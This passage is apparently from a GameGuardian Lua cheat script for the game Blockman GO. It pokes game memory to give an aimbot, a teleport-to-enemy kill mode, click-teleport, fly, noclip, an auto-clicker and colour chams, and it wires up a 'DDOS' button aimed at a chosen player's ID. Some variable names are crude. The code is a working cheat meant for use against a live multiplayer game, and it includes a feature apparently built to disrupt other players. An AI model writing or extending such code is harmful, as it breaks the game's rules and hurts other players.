tsp.prover={address=Open.Parachute.address,flags=1,freeze=true,value=0}
triggerHoldpr=true
end

else 
tsp[22]={address=Mag1[1].address+0x54A,flags=1,freeze=true,value=1}end
elseif holdbtnpr then
holdbtnpr=nil
if triggerHoldpr then
triggerHoldpr=nil
if not Rich then
if not freegc then pTextColor(1,0,0)else pTextColor(0,1,0)end pIconColor(0,0,0)
tsp.nf1,tsp.nf2,tsp.nf3,tsp.nf7,tsp.nf8,tsp.nf9,tsp.nf10,tsp.nf11,tsp.nf12,tsp.nf13,tsp.nf14={address=UI7[1].address+0x878+raznica,flags=4,freeze=true,value=4},{address=UI7[1].address+0x8e8+raznica,flags=16,freeze=true,value=45},{address=UI7[1].address+0x8a0+raznica,flags=2,freeze=true,value=';R'},{address=UI7[1].address+0x8a2+raznica,flags=2,freeze=true,value=';i'},{address=UI7[1].address+0x8a4+raznica,flags=2,freeze=true,value=';c'},{address=UI7[1].address+0x8a6+raznica,flags=2,freeze=true,value=';h'},{address=UI7[1].address+0x940,flags=16,freeze=true,value=-1}Rich=true
else
pTextColor(0,0,0)pIconColor(0,0.5,0)tsp.nf1,tsp.nf2={address=UI7[1].address+0x878+raznica,flags=4,freeze=true,value=0},{address=UI7[1].address+0x940,flags=16,freeze=true,value=-1}Rich=false
end
else
if Rich then
if not freegc then
freeGc(true)pTextColor(0,1,0)else freeGc(false)pTextColor(1,0,0)
end
else
if not onlyP then
pIconColor(0,1,0)onlyP=true
else
pIconColor(0,0.5,0)
onlyP=nil
end
end
end
end
tsp[21]={address=UI4[1].address+0x17c,flags=16,freeze=true,value=rotationMenu}
rotationMenu=rotationMenu+0.25
end
if rgbdebug and r120 then
tsp[18]={address=blockmanlib+0x5A0680,flags=16,freeze=true,value=r120}
tsp[19]={address=blockmanlib+0x5A0684,flags=16,freeze=true,value=g120}
tsp[20]={address=blockmanlib+0x5A0688,flags=16,freeze=true,value=b120}
end
if Open['StupidUI'].value~=0 then
tsp[10]=Main10['StupidUI']
end

if onlyP and Open.FlyActive.value==1 and not parachuteST then
tsp.parac1,tsp.parac2,tsp.parac3,tsp.parac4={address=Mag1[1].address+0x54A,flags=1,freeze=true,value=1},{address=Mag1[1].address+0x604,flags=4,freeze=true,value=3000},{address=Mag1[1].address+0x578,flags=1,freeze=true,value=1},{address=Mag1[1].address-184,flags=2,freeze=true,value=0}
end

if animres then
tsp.anmf,tsp.anmf2,tsp.anmf3,tsp.anmf4={address=Mag6[1].address+0x400,flags=4,freeze=true,value=animval},{address=Mag6[1].address+0x3f8,flags=4,freeze=true,value=animval},{address=Mag6[1].address+0x3fc,flags=4,freeze=true,value=math.random(23,99)},{address=Mag6[1].address+0x420,flags=4,freeze=true,value=math.random(23,99)}
Main10['Anim'].value=animval
tsp.anmf5=Main10['Anim']
end
if plavn then
tsp.plavn={address=Mag6[1].address-200,flags=16,freeze=true,value=-0.5}
plavn=nil
end
if custom1 and custom1+custom2<Open.ServerTime.value then
custom1=Open.ServerTime.value
if not custom10 then
custom10=true
actionOn(cnum1,true)
else
custom10=nil
actionOn(cnum2,true)
end
end
if ClickTP and Open['ClickTP'] and Open['ClickTP'].value~=0 and Open['BlockX'] and Open['BlockX'].value~= 0 then
max=math.sqrt((Open['X'].value-Open['BlockX'].value)^2+(Open['Y'].value-Open['BlockY'].value)^2+(Open['Z'].value-Open['BlockZ'].value)^2)
if max>53.5 then
tsp[14]=Main10['ClickTP']WizardMain(UI1,'Слишком далеко!',500,1,{1,1,0},true)else Main10['X'].value,Main10['Y'].value,Main10['Z'].value,MainUI['X2'].value,MainUI['Y2'].value,MainUI['Z2'].value,tsp[11],tsp[12],tsp[13],tsp[14],tsp[15],tsp[16],tsp[17]=Open['BlockX'].value,Open['BlockY'].value+1.1,Open['BlockZ'].value,Open['BlockX'].value+0.6,Open['BlockY'].value+2.9,Open['BlockZ'].value+0.6,Main10['X'],Main10['Y'],Main10['Z'],Main10['ClickTP'],MainUI['X2'],MainUI['Y2'],MainUI['Z2']plavn=true end end
if BreakTP and Open['Нажатие'].value==2 and Open['BlockX'].value~= 0 then
max=math.sqrt((Open['X'].value-Open['BlockX'].value)^2+(Open['Y'].value-Open['BlockY'].value)^2+(Open['Z'].value-Open['BlockZ'].value)^2)
if max>53.5 then
tsp[14]=Main10['ClickTP']WizardMain(UI1,'Слишком далеко!',500,1,{1,1,0},true)else Main10['X'].value,Main10['Y'].value,Main10['Z'].value,MainUI['X2'].value,MainUI['Y2'].value,MainUI['Z2'].value,tsp[11],tsp[12],tsp[13],tsp[14],tsp[15],tsp[16],tsp[17],tsp.plavn=Open['BlockX'].value,Open['BlockY'].value+1.1,Open['BlockZ'].value,Open['BlockX'].value+0.6,Open['BlockY'].value+2.9,Open['BlockZ'].value+0.6,Main10['X'],Main10['Y'],Main10['Z'],Main10['ClickTP'],MainUI['X2'],MainUI['Y2'],MainUI['Z2']plavn=true end end
if sexmod2 then
timer2=timer2+1
if not wizar1 and timer2 > 5 then
timer2,wizar1,Main10['Anim'].value,tsp[9],tsp[2]=0,true,2001,Main10['Anim'],Main10['AnimSt']elseif wizar1 and timer2>5 then
timer2,wizar1,Main10['Anim'].value,tsp[9],tsp[2]=0,false,4,Main10['Anim'],Main10['AnimSt']end end
if animFreezeDa and Open['AnimSt'].value~=-1 and Open['Ground'].value == 257 and timeground>50 and not narkoman then
Main10['Anim'].value=num1337
tsp[1]=Main10['Anim']
tsp[2]=Main10['AnimSt']
elseif narkoman and Open['Ground'].value == 257 then
if not anims then
anims={}
for i=1,15 do
anims[i]=i
if i<=14 then
anims[20+i]=999+i
end
end
anims[30]=2000
anims[31]=2001
end
narkval=narkval+1
Main10['Anim'].value=anims[narkval]
tsp[1]=Main10['Anim']
tsp[2]=Main10['AnimSt']
if narkval>=36 then
narkval=0
end
end
if AutoClickerStatus and Open['CurrentAim'] and Open['CurrentAim'].value==2 then
tsp[3]=MainUI['AutoClicker']
end
if DarkMaskSt and Open['DarkMask'].value==257 then
tsp[4]=Main10['DarkMask']
end
if sexmod then
if Open.CurrentAnim.value==0 then
MainUI['MoveState'].value,MainUI['Shift'].value,MainUI['RunState'].value,MainUI['Sprint'].value=1,257,1,1
tsp[5],tsp[6],tsp[7],tsp[8]=MainUI['MoveState'],MainUI['Shift'],MainUI['RunState'],MainUI['Sprint']
else 
MainUI['MoveState'].value,MainUI['Shift'].value,MainUI['RunState'].value,MainUI['Sprint'].value=2,1,1,257
tsp[5],tsp[6],tsp[7],tsp[8]=MainUI['MoveState'],MainUI['Shift'],MainUI['RunState'],MainUI['Sprint']
end
end
if rgbchams then
MainUI['Wizard228'].value,MainUI['Wizard225'].value,MainUI['Wizard229'].value=r120,g120,b120 tsp.penis1,tsp.penis2,tsp.penis3,tsp.penis4,tsp.penis5,tsp.penis6,penis7,tsp.penis8,tsp.penis9=MainUI['Wizard228'],MainUI['Wizard225'],MainUI['Wizard229'],{address=MainUI['Fishing'].address+0x154,flags=16,freeze=true,value=r120},{address=MainUI['Fishing'].address+0x158,flags=16,freeze=true,value=g120},{address=MainUI['Fishing'].address+0x15C,flags=16,freeze=true,value=b120},{address=MainUI['Fly'].address+0x144,flags=16,freeze=true,value=r120},{address=MainUI['Fly'].address+0x148,flags=16,freeze=true,value=g120},{address=MainUI['Fly'].address+0x14C,flags=16,freeze=true,value=b120}
if BedWarGame then
Main10.BedWarBP.value=0
tsp.bpbed=Main10.BedWarBP
end
end
if aimbotst1 then
max=math.huge
if WizardCopyID==1 then
if IDPL then
gg.copyText(IDPL)
WizardMain(UI1,'ID Скопирован!',2000,1,{1,0,1})
end
end
if DDOSEnable then
if Open.DDOSBtn.value~=257 and not ddostime then
ddostime=Open.ServerTime.value
elseif Open.DDOSBtn.value~=257 and ddostime+3000<Open.ServerTime.value then
ddostime=nil
tsp.updateDdos=Main10.DDOSBtn
end
if not SettingDDOS then
tsp.set1,tsp.set2,tsp.set3,tsp.set4,tsp.set5,tsp.set6,tsp.set7,tsp.set8,tsp.set9,tsp.set10,tsp.set11,tsp.set12,tsp.set13,tsp.set14=MainUI.showCon,MainUI.btnDDOSMain,MainUI.btnDDOSName,MainUI.DDOSMain,{address=Main10.DDOSBtn.address+12,flags=2,freeze=true,value=0},{address=MainUI.btnDDOSMain.address+12,flags=2,freeze=true,value=256},{address=MainUI.btnDDOSMain.address+0xA0,flags=16,freeze=true,value=Screen.X*0.643500644},{address=MainUI.btnDDOSMain.address+0xA8,flags=16,freeze=true,value=Screen.X*0.643500644+180},{address=MainUI.btnDDOSMain.address+0xA4,flags=16,freeze=true,value=Screen.Y*0.465277778},{address=MainUI.btnDDOSMain.address+0xAC,flags=16,freeze=true,value=Screen.Y*0.465277778+50},{address=MainUI.btnDDOSName.address+0xA0,flags=16,freeze=true,value=Screen.X*0.643500644},{address=MainUI.btnDDOSName.address+0xA0,flags=16,freeze=true,value=Screen.X*0.643500644+180},{address=MainUI.btnDDOSName.address+0xA4,flags=16,freeze=true,value=Screen.Y*0.465277778},{address=MainUI.btnDDOSName.address+0xAC,flags=16,freeze=true,value=Screen.Y*0.465277778+50}
end
if Open.DDOSId.value~=IDPL then
Main10.DDOSId.value=IDPL
tsp.enableIDPenis=Main10.DDOSId
end

end
local yot={}
for i=1,#player do
yot[i]=Open['player#'..i]end
if #yot==0 then return nil end
      if yot[5].value>0.124 then
      prohod=true
        for i=#linh*2,#yot,#linh do
        if myGameType=='1026' and staim.st.tnt then
        if yot[i].value==3 then
        prohod= true
        else
        prohod=false
        end
        if not prohod and yot[9].value==3 then
        prohod=true
        end
        end
          if (yot[i-iii1].value==0 or yot[i-iii1].value~=Open.TeamId.value or not staim.st.dteam) and (yot[i-(iii1-1)].value==1 and staim.st.sex1 or yot[i-(iii1-1)].value==2 and staim.st.sex2) then
          if yot[i-(6+iii1)].value==60 and yot[i-(2+iii1)].value>0.13 and prohod then
              kc=math.sqrt((yot[i-(5+iii1)].value-yot[2].value)^2+(yot[i-(4+iii1)].value-yot[3].value)^2+(yot[i-(3+iii1)].value-yot[4].value)^2) 
              if kc<max then
                max=kc
                yot1=yot[i-(5+iii1)].value
                yot2=yot[i-(4+iii1)].value
                yot3=yot[i-(3+iii1)].value
                HP22 = yot[i-(2+iii1)].value
                IDPL=yot[i-(1+iii1)].value
                if yot[i-(iii1-1)].value==1 then
                genPL='▢FF00FFFFBoy'
                else
                genPL='▢FFFF75FFGirl'
                end
              end
            end
        end
        end
        if max>9999 then if myGameType~='1026' then setTime1(0,3) WizardMain(UI1,'Поиск новых ▢FFFF0000врагов...',228000,1,{1,0,1}) lap2() end else
        if max<=dis then
          di=math.sqrt((yot1-yot[2].value)^2+(yot3-yot[4].value)^2)
           hh=math.abs(yot2-yot[3].value)
            gocD=math.atan2(hh,di)*180/math.pi
             if yot2-yot[3].value>0 then
               gocD=gocD*(-1)
             end
             if Open['View'].value==1 then
             jj1,jj2='45.0'/max,'45.0'/max
             else
             jj1,jj2=0,0
             end
             gocN=math.atan2(yot1-yot[2].value,yot3-yot[4].value)
                gocN=math.deg(gocN)-90
                if AimKiller then
                if max<=10 then
                AimKillSp=4
                Main10['NoClip'].value=1
                else
                Main10['NoClip'].value=0
                AimKillSp=25
                end
             local a = gocN * math.pi / -180
             local b = gocD * math.pi / 180
             Main10['movX'].value = (math.cos(b) * math.sin(a))*AimKillSp
             Main10['movY'].value = (-math.sin(b))*AimKillSp
             Main10['movZ'].value = (math.cos(b) * math.cos(a))*AimKillSp
             tsp.movX,tsp.movY,tsp.movZ,tsp.clip=Main10['movX'],Main10['movY'],Main10['movZ'],Main10['NoClip']
             end
             if max<=6 and not PCVersionSt then
             MainUI.PCValue.value=1
             tsp.pcver=MainUI.PCValue
             PCVersionSt=true
             elseif PCVersionSt and max>6 then
             MainUI.PCValue.value=0
             tsp.pcver=MainUI.PCValue
             PCVersionSt=false
             end
             
             if Open.CurrentAim.value==2 and not krestik then
             tsp.krest={address=MainUI['Krest'].address,flags=4,freeze=true,value=257}krestik=true
elseif Open.CurrentAim.value~=2 and krestik then
             tsp.krest={address=MainUI['Krest'].address,flags=4,freeze=true,value=1}krestik=false
             end
             
             if max<0.3 and Open['View'].value==1 and not TPKiller then
          else
                me[1].value,me[2].value,me[1].freeze,me[2].freeze,tsp['yaw'],tsp['pitch']=gocD+jj1,gocN+-jj2,true,true,me[1],me[2] if TPKiller then if myGameType~='901' then Main10['View'].value=0 else Main10['View'].value=Open.View.value end                Main10['X'].value,Main10['Y'].value,Main10['Z'].value,MainUI['X2'].value,MainUI['Y2'].value,MainUI['Z2'].value,tsp.x,tsp.y,tsp.z,tsp.x2,tsp.y2,tsp.z2,tsp.wv,tsp.flytrigger=yot3,yot2+0.2,yot1,yot3+0.6,yot2+2,yot1+0.6,Main10['X'],Main10['Y'],Main10['Z'],MainUI['X2'],MainUI['Y2'],MainUI['Z2'],Main10['View'],{address=Mag6[1].address+0x545,flags=1,freeze=true,value=1} end end if not hp25 then hp25 = HP22 end
if hp25 ~= HP22 then
hp25,hp1488=HP22,true
end
if not btmt2 or btmt2+85<Open.ServerTime.value then
btmt2=Open.ServerTime.value
hp1488 = nil
if HP22 >= maxHP*0.7 then
color777 = '▢FF00FF00'
elseif HP22 >= maxHP*0.4 then
color777 = '▢FFFFFF00'
elseif HP22 > 0.123 then
color777 = '▢FFFF0000'
end
distance0,HP23=math.floor(max+0.5),math.floor(HP22+0.5)distance0,HP23=string.format("%d",distance0),string.format("%d",HP23)
if not TPKiller then
if myGameType~='1014' then
if myGameType=='1037' then
stbotton3='Gender: '..genPL
else
stbotton3=color777..HP23..'▢FFFF0000♥'
end

bottomText2('ID: ▢FF'..rgb120..IDPL..'▢FFFF00FF | Distance: '..distance0..' | '..stbotton3,{1,0,1})
end
else
if myGameType~='1014' then
bottomText2('ID: ▢FF'..rgb120..IDPL..'▢FFFF00FF | HP: '..color777..HP23..'▢FFFF0000♥',{1,0,1})
end
end
c776=0 end c776=c776+1 end end else end end gg.addListItems(tsp)gg.clearList()end chh=chh+1 end
    
    while not false do
    checkGG228()
    end
    end
    else
    gg.alert("Этот скрипт создан исключительно для Blockman GO или его мини-игр❗", "")
    end